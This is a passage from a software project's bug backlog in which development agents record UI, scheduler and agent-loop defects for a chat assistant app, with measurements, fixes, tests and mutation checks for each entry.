- [x] **B1056** **The first-run tour hint covers the toast and the Workbench's toolbar corner.** Measured 2026-10-01: `.tour-hint` z-index 10031 over `#toast` 9999; the loop sentence's last line ("Remove one of those links to save it.") is hidden from x=1134; the same hint covers the Workbench's −/+/Fit and window buttons. `Verify:` an error toast is fully readable while the tour hint is up. — found by verify-a — **done on its `Verify:` 2026-10-01 (`865a59d`, `ba696c8`, agent `wb-polish`); the toolbar half is filed separately (where `tourHints.js` places the hint, not what the toast stacks over).** `tourHints.js` takes the hint's z from the live stack (`toolWindowZOrder.js:topPortalZ`, at least 10031, climbing as windows are raised), so the toast now sits at the top of the z range (`#toast.toast { z-index: 2147483000 }`) — above every window, overlay and the confirm dialog, and out of reach of the window counter, which is why not `100000` (`tests/test_portal_dropdown_z_js.py` forbids that literal: `#4720`). It takes no pointer but its own button. Driven in Chromium: Tasks opened (the hint at 1134,65–1374,309, z 10031), a looping chain saved from the form; the refusal toast at 1024,16–1384,109 **fully on top — 0 of 1,035 points covered**. `Verify:` `tests/test_a_toast_is_read_over_the_tour_hint.py` — **2 cases in headless Chromium**: the real `style.css` and `#toast`, a hint at the measured place with `topPortalZ()`'s z (read from the module) and a higher one; every point of the toast must be the toast's. **1 of 2 red before** (the premise case passes). **Mutation, 1 of 1:** a toast just above the floor (10032) is covered by a raised window's hint.

- [x] **B1057** **`static/js/tasks.js` above `_drawDryPlan` still says the card polls `/runs` for the plan.** The integration commit removed the polling; the comment was left. `Verify:` the comment says the plan is read off the reply. — found by verify-a — **done 2026-10-01 at the merge (`a97d969`'s follow-up)**: the comment now says the route answers once the run is written and carries it, so the card asks the history for nothing.

- [x] **B1058** **The text-mode tool prompt does not mention `manage_tasks` `dry_run`.** `TOOL_SECTIONS["manage_tasks"]` (`src/agent_loop.py:1127`) listed `list|create|edit|delete|pause|resume|run`, and agent-mode retrieval's description (`src/tool_index.py:101`) named no dry run either, so a model on the fenced-block channel was never told the action `P22-04`'s server half added to the function schema. — found by `P22-04` — agent:`wb-graph` — **done 2026-10-01 at the merge (`a97d969`).** Both name `dry_run`; `tests/test_the_text_mode_tasks_line_names_every_action.py` holds the text line's action list equal to the schema's enum, read from the live objects (2 cases; the old line fails one).

- [x] **B1059** **A dry run resets a task's failure streak, so it hands out a fresh retry budget.** — **done 2026-10-01 (`339e7e3`, agent `wf-engine`).** The row's one line, measured first: `consecutive_failures` read every run, and a dry run is recorded `skipped`, which ended the count. It now reads real runs only — `.filter(real_run_clause(TaskRun))`, `B1054`'s predicate — so a dry run between two failures leaves the retry count and `P15-08`'s backoff rung where they were; a real skip still ends the streak (`Law 1`). `Verify:` `tests/test_a_dry_run_leaves_the_retry_count_alone.py` — 3 cases on the real scheduler and a real SQLite file (three real failures, a real dry run through `run_task_now(dry=True)`, a fourth failure); **2 of 3 fail on `5654cd4`** (the third is the `Law 1` guard). **Mutation, 1 of 1 caught** (dry runs counted again: 2 of 3 red).
  - **MEASURED 2026-10-01** (`/tmp/scratch-wb-runs/probe_streak.py`, the real functions on a real SQLite file).
    - Setup: a task with `max_retries=3` and three failures in a row. `consecutive_failures` is 3, so the next failure goes back to its schedule.
    - After one *Show me what this would do*: `consecutive_failures` is **0**, and the next failure is planned as *"Failed — retrying (attempt 1 of 3) in 342 seconds"*.
  - **Why:** `consecutive_failures` stops at any `skipped` row, and a dry run is one. It is a side effect of the one button that promises none (`P8-33`). It also resets `P15-08`'s backoff ladder — the half that keeps a provider from banning the owner.
  - **Fix:** one line. `.filter(real_run_clause(TaskRun))` in `consecutive_failures` — the predicate `B1054` added.
  - `Verify:` a dry run between two failures leaves the retry count and the backoff where they were.
  - — found while working `B1054` — agent:`wb-runs`

- [x] **B1060** **A background run the gate stops while it is queued never comes back unless it is a scheduled task, though its row says "Paused".** — **done 2026-10-01 (`a2cdf2b`, agent `wf-engine`), as the integrator's call on the row.** A background run waits for Pantheon to be idle BEFORE it takes the model slot (`_wait_until_idle`), holding nothing, and checks again once the slot is held (a person who arrived meanwhile gets the slot back); its row says "Queued — waiting for Pantheon to be idle…" and its step log "Waited N for Pantheon to be idle, then started" after its trigger. The gate stops RUNNING background runs only (`_gate_stoppable`); a stopped run goes back in the queue with the SAME trigger — webhook body, event, the step before — holding its claim, and its row says "… It will run again, with what started it, once Pantheon is idle.", or "It will not be retried: <why>" when the task was switched off meanwhile or after `FOREGROUND_STOPS_LIMIT` (3) stops in a row; `next_run` is not moved for a run that has not happened (it was `now + 15 min` for every trigger type). A Stop pressed between the two attempts is the last word ("Stopped by user"). Queued scheduled runs now start when Pantheon goes idle rather than fifteen minutes later — a timing change, not a policy one. Workflow runs go through the same gate. `Verify:` `tests/test_a_background_run_waits_for_idle_with_its_trigger.py` — 11 cases through the real gate, the real scheduler and the real event bus on a real SQLite file; **11 of 11 fail on `5654cd4`** (6 on behaviour, 5 on a new name); `tests/test_run_now_runs_while_pantheon_is_open.py`'s two `B1047` cases that pinned "the page stops a waiting run" and "+15 min" now pin the call. **Mutation, 15 of 15 caught** (one of them by a red case and then a hang) — the table is in `/work/notes/wf-engine.md`.
  - **MEASURED 2026-10-01 in Chromium** against this branch.
    - A webhook-fired task's run waited "Queued — waiting for Pantheon to be idle…" while the page was open, then ended `aborted · Paused because Pantheon became active`.
    - The task's `next_run` stayed NULL, and no run followed. The webhook's payload is gone.
  - **INFERRED from code:**
    - `_execute_task`'s cancel branch re-queues only through `_defer_immediately_due_task`, which needs a past `next_run`. Event, webhook and chained background runs never have one.
    - The running-phase takeover sets `next_run = now + 15 min` for any trigger type, so an event/webhook task would be dispatched by `_check_due_tasks` 15 minutes later as a plain run, without its payload.
    - Consequence: an event-triggered task (`document_updated`, …) — fired by the person's own action, while they use Pantheon — practically never runs.
  - **Not new on the shipped image:** Python 3.12+ (Docker is 3.14) never swallowed the cancel. On 3.11 the swallow had been running such runs later, after recording "Stopped by user". `B1047` fixed the swallow, as its `Verify:` requires, so 3.11 now matches.
  - **Proposed:**
    - Wait for idle *before* taking the model slot, so a waiting background run holds nothing and the gate need not stop it. It waits, says so, and then runs with its trigger.
    - Stop only background runs that are running. Re-queue those with their trigger, or say they will not be retried.
    - This changes when queued scheduled runs happen (as soon as idle, not 15 minutes later). That needs the owner's or integrator's call, which is why it is filed rather than done.
  - `Verify:` with Pantheon open, a webhook-fired task runs once Pantheon is idle, with its payload, and its row says it waited.
  - — found while driving `B1047` — agent:`wb-runs`
  - **Integrator's call 2026-10-01: take the proposal** — a background run waits for idle *before* it takes the model slot, so the gate need not stop a queued run; it runs with its trigger once Pantheon is idle and its row says it waited; only a running background run is stopped, and it is re-queued with its trigger or says it will not be retried. Queued scheduled runs then happen when Pantheon goes idle rather than fifteen minutes later — a timing change, not a policy one: the gate's purpose (background model work never slows a person's chat) is unchanged. Recorded here rather than as an owner decision; the owner can overrule it cheaply.

- [x] **B1061** **Two more doors where a person asks for a run still start background-gated work.** — **done 2026-10-01 (agent `wf-api`, `55062fd`). The premise held at both doors, and `manage_tasks` could be answered without guessing.**
  - The assistant's check-in *Run now* (`routes/assistant_routes.py:run_check_in_now`, "manual test") calls `run_task_now` with no `started_by`.
  - `manage_tasks` `run` does the same.
  - So with Pantheon open both wait for idle — the defect `B1047` fixed for the task route. **INFERRED from code**; the same path was **MEASURED** for the task route before `B1047`.
  - The assistant route is not in `wb-runs`' files.
  - `manage_tasks` is a real question. The tool is called from a person's chat turn and from a scheduled agent run alike, and only the first is a person asking. The loop would have to say which.
  - `Verify:` with Pantheon open, the assistant's check-in *Run now* runs.
  - — found while working `B1047` — agent:`wb-runs`
  - **The assistant's check-in *Run now*.** `run_check_in_now` now passes `started_by=STARTED_BY_PERSON`, as the task route's buttons do (`B1047`).
    - **Measured live, before and after**, with a tab's heartbeat running throughout against `app.py`, auth on, no model.
    - Base `assistant_routes.py` (on `5654cd4`, before wf-engine's `B1060`): the run ended `aborted · Paused because Pantheon became active`. With `B1060` merged it would wait queued instead; either way it does not run while the page is open.
    - This branch: it reached its executor, ending `error · No model/endpoint configured`, the run's own answer (`/tmp/scratch-wf-api/drive_b1061.py`).
  - **`manage_tasks run`.** Measured: `stream_agent_loop` already says whose turn it is, as `workload`.
    - Its callers are a person's chat (`routes/chat_routes.py`), the teacher inside one, a skill test a person pressed (`routes/skills_routes.py`), the background-job follow-up in the person's own session (`src/bg_monitor.py`) and the scheduler's agent runs.
    - Only the scheduler passes `"background"` (`src/task_scheduler.py`). The local model gate (`llm_core`) already reads that word to decide whose model call yields.
    - A bearer token's chat never reaches `manage_tasks` (`NON_ADMIN_BLOCKED_TOOLS`, `B70`).
    - So the loop binds `workload` into each tool call's own task at the two `execute_tool_block` sites, beside `bind_run_limits`, as a `ContextVar` that ends with the call (`src/interactive_gate.bind_tool_call_started_by`). `manage_tasks run` reads it (`tool_call_started_by`). Anything unbound is background, which is today's answer for every caller.
    - The one judgement, stated: the background-job follow-up continues a person's own request in their own session and already runs its model calls as foreground. A run it asks for is the person's by the same word.
  - **What this does not change.** `started_by` decides only whether a run waits for Pantheon to be idle. Who may run what is the admin gate and the post-external gate, both unchanged (`Law 17`: no adversary gains anything).
  - `Verify:` with Pantheon open, the assistant's check-in *Run now* runs. Driven as above.
  - `CI:` `tests/test_a_person_asking_for_a_run_is_not_kept_waiting.py` (6), on the real gate, the real `TaskScheduler`, the real assistant handler, the real `do_manage_tasks` and the real `stream_agent_loop` with a scripted model.
    - Each fix's revert fails its own case: the assistant route, `manage_tasks` and the agent loop at base each fail 1 of 6.
    - **Mutation, 4 of 4 caught:** `manage_tasks run` background again, 1; the assistant's *Run now* background again, 1; every tool call counted as a person's, 3 (the scheduled agent's run stops waiting); the loop binding nothing, 1.

- [x] **B1062** **Activity's compact row for an aborted run says nothing about why.** — **done 2026-10-02 (`4dcc6b4`, `6866b42`, agent `wf-ui`). The premise held**: the row's head carried a skipped run's "skipped — <why>" and a failed run's "(failed)", and nothing for `aborted`. The head now says it, from the text History shows for the run (`result`, else `error`, which `_runToActivityEntry` already carried), in `runStatus.js`'s word: "stopped — Paused because Pantheon became active"; a reason that already says it stopped ("Stopped by user") is said once; a run that left none says "stopped — no reason was recorded"; escaped, first line only, 160 characters at most, italic and clipped in the one-line head. `Verify:` driven in Chromium on wf-ui's tree (showcase harness, `/tmp/scratch-wf-ui/drive.py`): a webhook-started *Webhook digest* on the scripted model, pre-empted by foreground requests (`aborted`, "Paused because Pantheon became active"); Tasks → Activity, dark and light: "Webhook digest · stopped — Paused because Pantheon became active · 1m ago". `tests/test_a_stopped_run_says_why_js.py` — **5 cases**, the real `_runToActivityEntry` and `_renderActivityEntry` on the scheduler's own two stop sentences (imported); 4 of 5 red on the base (the fifth: every other row drawn as before). Mutation 5 of 5 (no word 4; said twice 1; silent with no reason 1; the reason raw 1; the whole reason 1). `test_run_status_is_one_vocabulary.py`'s cut of `_renderActivityEntry` reaches the helper (it sits after its one caller).
  - **MEASURED 2026-10-01 in Chromium** (`/tmp/scratch-wb-runs/shots/*-04-activity.png`).
    - The pre-empted *Webhook digest* row reads only its name and "just now".
    - Skipped rows say "skipped — <why>" and failed rows "(failed)".
  - The reason is one click away in History ("Stopped · Paused because Pantheon became active").
  - `static/js/tasks.js` (wb-polish's file).
  - `Verify:` an aborted run's Activity row says it stopped and why.
  - — found while driving `B1047` — agent:`wb-runs`

- [ ] **B1063** **A task made with a housekeeping action is deleted by the next list.** Measured 2026-10-01 on `46f6ce8`-based `wb-polish`: `POST /api/tasks {"name": "Tidy memories", "task_type": "action", "action": "consolidate_memory", "trigger_type": "webhook"}` → **200** with an id (`is_builtin: true`); the next `GET /api/tasks` does not list it, and `GET/PUT /api/tasks/<id>` answer **404** — a second create (`"My memory tidy"`) took a `PUT` while it existed and 404'd after one list. `ensure_defaults` (`src/task_scheduler.py`, the dedupe over `HOUSEKEEPING_DEFAULTS` actions) keeps one task per housekeeping action per owner and `db.delete`s the rest, so the person's own task is removed with no word (`Law 1`). The form offers these actions, and P22-04's own `Verify:` wants a chain through two of them (`consolidate_memory`, `audit_skills`). Fix: dedupe only the rows the defaults created (by name/`legacy_names`, or a marker), or refuse the create in words. `Verify:` a task created with a housekeeping action is still there after the list is read, and can be chained. — found by `wb-polish` (setting up `P22-04`'s Verify)

- [ ] **B1064** **Most of the task form's labels are not tied to their fields.** Counted 2026-10-01 in `static/js/tasks/taskFields.js`: 20 `<label class="task-form-label">`, 4 with `for` (time zone, retries, time limit, an action's argument); *Name*, *Type*, *Prompt*, *Persona*, *Trigger*, *Frequency*, *Time*, *Action*, *Output*, *Model*, *Chain* and the rest name nothing, so their fields have no accessible name (a screen reader reads a placeholder, or nothing) and a click on the label does nothing. Per-mount ids (`B1041`) would let one change tie all twenty. `Verify:` every field in the form is announced by its label, in both windows at once. — found by `wb-polish` (weighing `B1041`)

- [ ] **B1065** **The first-run tour hint covers a window opened after it.** The half of `B1056` the toast's stacking cannot reach: `tourHints.js:_show` places the hint beside the window that triggered it, on top of everything (`topPortalZ()`), for 14 s; a window opened in that time — the Workbench, measured by verify-a — has its −/+/Fit and its window buttons under the hint. Placement is `tourHints.js`'s, not wave B's. `Verify:` with the hint up, opening another window leaves that window's controls uncovered (the hint moves, yields, or goes). — found by verify-a, split from `B1056` by `wb-polish`

- [ ] **B1066** **The canvas reads one server sentence to know a step cannot be described.** `P22-04`'s canvas half puts *"A dry run cannot tell you what this would change."* on the two `DRY_CANNOT` actions' steps by finding that sentence in the plan (`canvas.js:CANNOT_SAY`), because nothing on the wire says which actions they are: `/meta/actions` (`build_action_palette`) serves no `dry` verdict and a plan is lines of text. If `dry_run_plan` rewords it, the step silently says what the action would run instead (`Law 7`, `Law 10`). Fix: serve each action's `dry` verdict on the palette (or a `verdict` per chain entry), and read that. `Verify:` rewording the sentence in `dry_run_plan` leaves the canvas saying a dry run cannot describe those two. — found by `wb-polish`

- [x] **B1067** **Clicking another step drops the open step's unsaved edits.** `B1052` made Escape ask before closing a form with edits; opening another step (a click, Enter, *New step*) still closes the open form through `canvas.js:openPanel` → `closePanel(false)` with no word, and the edit is gone — the same loss by a different door. `Verify:` with an edited step open, opening another step asks first, or keeps the edit. — found by `wb-polish — **done 2026-10-02 (`ef8181c`, agent `wf-ui`). The premise held** (`openPanel` → `closePanel(false)`, no word). `B1052`'s rule, by the other door: opening another step — a click, Enter, *New step* — with an edited form says "Nightly backup has changes that are not saved. Open Message me again to close it without saving them, or Save first." with *Open Message me without saving*, and keeps the form; the same request again (or the button) is the yes, and says "Closed Nightly backup without saving."; typing in between asks again; the open step asked for again keeps its form and asks nothing. The workflow room inherits it, and its own doors (another workflow, the tasks, the window) ask *Save / Discard / Keep editing*. `Verify:` driven in Chromium (dark, light): *Nightly backup*'s name edited, *Message me* clicked → the sentence above, *Nightly backup* still open; its button → *Message me* open, "Closed Nightly backup without saving." `tests/test_opening_another_step_keeps_the_edit_js.py` — **5 cases** on the real canvas (tasks source and a workflow source); 5 of 5 red on the base. Mutation 5 of 5 (never asks 4; not re-armed 1; the open step reopened drops its form 1; no word after dropping 3; *New step* does not ask 1).

- [x] **B1068** **With `prefers-reduced-motion: reduce`, opening the Workbench or the Forge window freezes the tab.** `P1-12`'s guard gives every element `transition-duration: 0.01ms !important`, so an element whose `transition-property` is the initial `all` now transitions `z-index` too. `static/js/ui.js`'s modal auto-promote (`_promote`, the MutationObserver at ≈1598–1617) sets `z-index`, the observer fires on the style change, and the guard reads `getComputedStyle(m).zIndex` — still the old value mid-transition — so it is never "already on top" and bumps again, forever, in microtasks: no frame is ever painted. Measured in Chromium on `76d8bb5` with `reduced_motion=reduce`, a probe counting `z-index` writes with a breaker at 500: Workbench 501 and Forge 501; Library, Tasks, Brain, Notes, Calendar, Theme, Gallery, Compare, Deep Research 1–2. Under `no-preference` the Workbench takes 1. The computed value read inside the loop was `250` while the inline value was `1001 !important`. A person who sets reduced motion in their OS cannot open the Workbench. `Verify:` with reduced motion, opening each tool window writes `z-index` at most twice and the page still answers `evaluate` — e.g. compare against the inline value `_promote` itself set, or keep `z-index` out of the guard's transition. — found by `showcase` (the capture runs with `no-preference` for this reason) — evidence `/tmp/scratch-showcase/zall.py`, `wbz3.py` — **done 2026-10-01 (`6c12f33`, agent `w8-ui`). The premise held, with a second reader: `modalManager.js:_bringToFront` read the same stale value and pushed a window `ui.js` had just raised to 1001 back down to 301.** The loop's cause is the read, so the read changed: `toolWindowZOrder.js:toolWindowZ(el)` answers the z a window was *given* — every z this product gives a tool window is written inline with `!important`, which only a transition outranks — and the computed one only for a window nobody raised. The auto-promote guard, the click-to-front, `_bringToFront` and the stack's own `topToolWindowZ` read through it. The guard is untouched: reduced motion stays honoured (the Workbench's transitions still read 0.01ms). `Verify:` `tests/test_reduced_motion_opens_every_window.py` — **28 cases**: the helper under node with a window whose computed z lags its own (2), and the real app in headless Chromium with `reducedMotion: 'reduce'`, eleven tool windows each opened from its sidebar door on a fresh page with the `showcase` probe counting `z-index` writes (≤ 2 writes, never pushed back down, the Workbench and the Forge on top, the guard still applies, 1 write with motion allowed, no page errors). **6 of 28 red on the previous tree** (both helper cases, the Workbench and the Forge at 501 writes, the Forge pushed 1001 → 301, the probe's breaker throwing). **Mutation, 5 of 5 caught:** the helper ignoring the given z 7; the promote guard reading the computed z 7; `modalManager` reading it 2; the helper trusting a non-`!important` inline z 1; the stack reading others' computed z 1. **Driven on the seeded demo** (`showcase`'s pipeline, 1400×860, reduced motion on, dark and light): every one of the eleven doors took 1–2 `z-index` writes (Workbench 1, Forge 2, Calendar 2, Gallery 2, the rest 1), the window it opened was on top, every transition read `1e-05s`, the page answered every question, no page errors.

- [x] **B1069** **After a card is approved part-way through an agent turn, the model is asked again without the tool results it had already gathered in that turn.** Measured with the showcase's scripted model on the filing chat: before the card, the request carried `[system, user, assistant(tool_calls), tool]` with the `manage_documents list` result (every document id); after *Allow for this task*, the next request carried `[system, user, assistant("Allow this task to continue?"), user(the approved call's result)]` — the round-1 result is gone. A model that needs those ids must call again or guess; the stand-in, counting what it was sent, called `reorganise` with empty ids and was told *"Step 1 (move): Say which documents to move."* An approval on the turn's **first** call loses nothing, which is why it went unnoticed. May be deliberate (the continuation is a sealed control-plane request), in which case the model should be told what it did before the card. `Verify:` approve a card on a turn's third call; the next request carries the results of calls one and two. — found by `showcase` — evidence `/tmp/scratch-showcase/filing_dbg2.py` — **done 2026-10-01 (agent `w8-agent`, `b3588b1`). Not deliberate: the continuation was rebuilt from saved history, which keeps a turn's words and not its tool traffic.** **Measured first**, with the scripted model recording every request through the real app (`/tmp/scratch-w8-agent/measure_b1069.py`): the row holds — and a card on the *second call of a turn's first message* loses the first call's result too, so "the first call loses nothing" was only true of a first call alone. **The card now keeps the turn it stopped**: `agent_loop.PausedTurn` on `PendingToolApproval.continuation_turn` — every message the run had added (marked `_agent_in_turn` by `_append_tool_results`, a delivered steer and the loop's own nudges; stripped by `llm_core._sanitize_llm_messages`' whitelist before any provider sees it, beside `metadata` and `_agent_injected`), and the paused round as `_append_tool_results` would have taken it — its text and reasoning, its calls up to the gated one, the results of the calls before it. On resume (`_resume_paused_turn`) the saved stand-in reply (*"Allow this task to continue?"*, and those of earlier cards in the same turn, `replaces`) is taken out and the round appended with the approved result answering the model's **own call id**. A card that kept no turn (the teacher's, the skill tester's, one minted before this) resumes exactly as before and leaves its saved reply in the history. **Round 1 of a fallback** was built from the route-neutral history the run started with, which holds nothing the run added — so a resumed turn reached a fallback without the approved result at all, and a steer delivered at round 1 reached the primary and not the fallback (both measured through the real route, loop and wrapper with the primary down); it is now that history with the stand-ins out and what the run added after it (`_round_one_source_messages`). **The adversary (`Law 17`)**: a hostile tool result, or the model it steers, wanting an action the person never approved; another signed-in person or a client replaying or forging a card. Unchanged against each: the record is outside `_binding_payload` and the digest and authorises nothing (the dispatcher runs the sealed tool and content and nothing else); it is server-only — never in `public_payload`, never read from a request; it is reachable only through `consume()`, which checks owner and session before it pops, so single use and owner binding are what they were; and restored messages keep their gate metadata, so the resumed run re-arms from them each round (`observe_messages`) and its taint is the interrupted run's, with the sealed taint ORed in at start as before (`FORBIDDEN.md` Part 2). In memory for the card's life: superseded by the next card in the chat, dropped on consume, expiry or the next ordinary message. `scripts/showcase/demo_model.py`, kept small and test-facing only: a test may hand it its own script, its log keeps each request whole, a step may make several calls at once (the batch case), and a conversation may be *fenced* (an endpoint sent no tools); the showcase's own script is unchanged. `Verify:` approve a card on a turn's third call; the next request carries the results of calls one and two. `CI:` `tests/test_an_approval_part_way_keeps_what_the_turn_learned.py` — **7 cases** through the real app (`capture.Server`; documents made through the API; every turn and every card's answer through `/api/chat_stream`; every tool run for real; the scripted model keeping each request): the row's third-call card (the request after it is the request before it, message for message, then the gated call answered under its own id); a card on the second call of one message; a model sent no tools (results still wrapped behind the guard); the card's payload carries none of it; on a strict rung, a turn the gate armed is still armed after the card and the next card names the task list that armed it (a name only the restored transcript holds), twice stopped and the last request carrying all three results; a clean turn stays clean and its approval still runs (the note is written); a card after a teacher's leaves the teacher's reply. `tests/test_a_fallback_resumes_with_the_turn.py` — **3 cases** through the real chat route (the approval route), loop and fallback wrapper, the primary answering 503: a resumed turn reaches the fallback whole; a round-1 steer reaches the fallback; a fresh turn's fallback is still built from history. **8 of 10 fail on the old tree** (the payload guard and the fresh-turn guard pass). **Mutation: 13 of 13 caught**: the record ignored on resume 6; no earlier rounds kept 5; the paused round's earlier results dropped 1; the stand-in left in 6; restored messages without their gate metadata 1; round-1 fallback from history alone 2; tool rounds not marked 5; a later card forgetting the stand-ins already replaced 2; a card after a teacher's dropping the teacher's reply 1; the gated call left out of the round 5; steers not marked 1; the card minting no record 5; the payload carrying the record 1. — agent:`w8-agent`

- [x] **B1070** **The Brain says "No memories yet" for seconds while it loads them.** Measured on the seeded demo with a chat open: `GET /api/memory` was sent 7.4 s after clicking Brain (after `/api/email/unread-state`, `/api/email/accounts`, `/api/models`, `/api/personal`, each ~0.5 s apart), and the empty-state sentence showed the whole time while eight memories existed; the API itself answers in 4 ms. An empty state that is really a loading state is a false statement (`Law 10`). `Verify:` opening the Brain with memories never shows "No memories yet"; it says it is loading, or the list arrives without the chain of waits. — found by `showcase` — evidence `/tmp/scratch-showcase/brain_net.py` — **done 2026-10-01 (`eb96985`, agent `w8-ui`). One correction to the premise: the requests seen before it on the wire were other warmups and polls, not a chain it waited behind — the window never asked.** Two causes in `static/js/memory.js`: the list was drawn from a module variable that starts as `[]` and only a load in flight said "loading", so before the first load the empty state was drawn (`Law 10`); and the Brain's door only redrew what it had — the store was asked by `app.js`'s startup warmup (12 s after boot, then an idle callback) or by `sessions.js` 2.5 s after a chat loaded. Now the module knows whether its list is the store's answer yet; until it is, the list and the count say *Loading memories...* / *loading...*, and a failed load says *"Could not load memories — the server answered 500. Reopen the Brain to try again."* instead of calling the store empty. The window asks for itself: a MutationObserver on `#memory-modal` calls `loadMemoriesIfUnknown()` when it is un-hidden, so every door (sidebar, rail, `/memory`, the shortcut, a chat's "memories used" row) gets it; a list already known is left alone. Only asking and reading sit inside `loadMemories`' `try`. `Verify:` `tests/test_the_brain_says_it_is_loading.py` — **9 cases**: the real `memory.js` under node (loading, not empty, before the answer; opening asks once, waits saying loading, draws, a second open asks nothing; a failed load says so and the next open asks again; an empty store still says *No memories yet* / *0 memories*) and the real app in headless Chromium at 1400×860 and 390×844, the Brain opened 0.5 s after boot (never *No memories yet*; asked < 1.5 s, drawn < 3 s; no errors). **8 of 9 red on the previous tree** (the green one is the no-errors guard). **Mutation, 6 of 6 caught:** the empty state before the answer 1; the window not asking 5; every open reloading 1; a failed load reading as empty 1; the count guessing 1; a failed load remembered as known 1. **On the seeded demo**, dark and light: `GET /api/memory` 134–197 ms after the click, the list at ~300 ms, *Loading memories...* until then, never the empty state.

- [x] **B1071** **The style observer's record is drawn in the Brain as a blank memory card.** Before a style profile forms (`observed` < `needed`, 18 of 20 here), `GET /api/memory` lists the `kind: "style"` record with `text: ""`, and `memory.js` draws it among the memories as an empty card reading only *style · auto · Nm ago*. `B820` says the Brain "renders none of it"; it renders it, empty. `Verify:` with a style record and no profile, the Memories list has no empty card (the record is drawn by `B820`'s panel or not at all). — found by `showcase` — evidence `/tmp/scratch-showcase/evidence/brain-blank-style-card.png` (the README's Brain picture sorts *Oldest* so the card is below the fold) — **done 2026-10-01 (`82c5ef3`, agent `w8-ui`). It was also counted (*8 memories* over seven) and given a *style* chip.** `memory.js:_memoriesFrom(data)` is now the one reading of a `GET /api/memory` answer, used by the window's load and by Tidy's own re-read: a style record with no text is not drawn, counted or chipped. A formed profile's text is still drawn as its card — until `B820`'s panel it is the one place the profile can be read, corrected or deleted (`Law 1`). `Verify:` `tests/test_the_style_record_is_not_a_blank_memory.py` — **4 cases** on the real `memory.js` under node: with the unformed record and two memories, two cards, *2 memories*, tab *2*, no *style* chip; a store holding only the record says *No memories yet* / *0 memories*; a formed profile's text is still a card and counted; after a Tidy the redrawn list has no blank card. **3 of 4 red on the previous tree** (the green one is the `Law 1` guard). **Mutation, 4 of 4 caught:** the blank record kept 3; every style record dropped, the formed profile too 1; Tidy reading the list its old way 1; the window reading it its old way 2. **On the seeded demo** (8 rows, the style record at 6 of 20), dark and light: 7 cards, none blank, *7 memories*, tab *7*, chips all/contact/fact/identity/preference/project.

- [x] **B1072** **On light palettes the model's name on a reply is drawn at 1.6:1 contrast.** `static/js/chatRenderer.js` `modelColor()` colours the role line `hsl(hue, 55%, 65%)` from a hash of the model name — a lightness chosen for dark backgrounds — and `applyModelColor` sets it inline. Measured on `light`: `scripted-demo` is `rgb(117, 212, 215)` on the bubble's `rgb(250, 246, 240)`, **1.60:1**. The sixteen palettes must stay legible (`D-2026-09-14-03`). `Verify:` on every light palette the role line's contrast against its bubble is ≥ 4.5:1 for any model name (e.g. lightness from the palette, or `light-dark()`). — found by `showcase` — evidence `docs/media/chat-light.png`, `/tmp/scratch-showcase/evidence/light-model-name-contrast.png` — **done 2026-10-01 (`440a04c`, agent `w8-ui`). Measured before, over 410 names: the worst on the four light palettes was 1.41:1 (`light`, a yellow) to 1.52:1 (`paper`); computed over all 360 hues, none reached 4.5:1 on any light palette (the best, a pure blue, 3.69:1 on `light`).** `modelColor` returns a `light-dark()` pair, which follows the `color-scheme` `theme.js:applyColors` sets from the palette, so switching palettes recolours it without a redraw. The dark arm is the old colour to the character (the twelve dark palettes paint exactly what they did); the light arm keeps the hue and saturation and takes, per hue, the largest lightness whose WCAG luminance is at most `MODEL_NAME_LIGHT_Y` (0.12) — ≥ 5.7:1 on every light palette's bubble, ≥ 4.5:1 on any bubble of luminance ≥ 0.72 (a custom light palette). No token, no `--accent`, no CSS. The Forge's model titles (`cookbookServe.js`) and group chats read the same function. `Verify:` `tests/test_the_model_name_is_legible_on_light_palettes.py` — **8 cases**: the shipped functions and the shipped `THEMES` cut out of `chatRenderer.js`/`theme.js`, run under node and checked with Python's own colour arithmetic (16 palettes, 4 light; all 360 hues ≥ 4.5:1 on every light bubble; the light arm keeps the hue; the dark arm is `hsl(h, 55%, 65%)`; a name gets its hue's pair), and the real app in headless Chromium — each of the sixteen palettes applied by the page's own `applyColors`, sixty names coloured by its own `applyModelColor`, contrast read from what the browser resolved against the composited bubble. **6 of 8 red on the previous tree** (the dark-unchanged and no-errors guards stay green). **Mutation, 6 of 6 caught:** the light arm the dark colour 2; a target too light 2; the dark arm moved 2; one colour for both schemes 4; the light arm losing the hue 4; the luminance weights swapped 2. **On the seeded demo after:** `scripted-demo` `rgb(32, 107, 109)`, 5.76:1 on `light`; worst of 410 names 5.71 (light), 6.15 (paper), 5.80 (lavender), 5.87 (cute); every dark palette's figures identical to before.

- [x] **B1073** **The composer has two `#message` textareas after its first resize.** `static/js/ui.js` `autoResize()` measures with `textarea.cloneNode(false)` appended beside the real one, which copies `id="message"`, `required`, `autofocus` and `aria-label`; measured after load: two `textarea#message` in `.chat-input-top`, the second hidden. `getElementById` still finds the first, so nothing visible breaks; `querySelectorAll('#message')`, a strict locator (it broke the showcase's first GIF run) and an HTML validator do not. `Verify:` after typing, exactly one element has `id="message"`; the clone carries no id, `required`, `autofocus` or label. — found by `showcase` — **done 2026-10-01 (`b176e0d`, agent `w8-ui`).** The measuring copy drops what only names, labels or submits it — `id`, `name`, `form`, `required`, `autofocus`, every `aria-*` — and is `aria-hidden="true"`, `tabindex="-1"`; what shapes the text it measures (rows, wrap, placeholder, its copied style) stays, so the resize is unchanged. `Verify:` `tests/test_the_composer_has_one_message_box.py` — **7 cases** in the real app in headless Chromium at 1400×860 and 390×844, through real keys: after typing the copy exists and exactly one element is `#message` (a strict locator answers one; focus stays on it); the copy carries no id, name, required, autofocus or label and is out of the accessibility tree and the tab order; the composer still grows with wrapped text and shrinks when cleared; no errors. **6 of 7 red on the previous tree** (the green one is the no-errors guard). **Mutation, 6 of 6 caught:** nothing stripped 6; the id kept 6; the label kept 2; required and autofocus kept 2; not aria-hidden 2; left in the tab order 2. **On the seeded demo**, dark and light, after typing: one `#message`; the copy reads `<textarea placeholder="Message Pantheon..." autocomplete="off" rows="1" enterkeyhint="enter" aria-hidden="true" tabindex="-1">`.

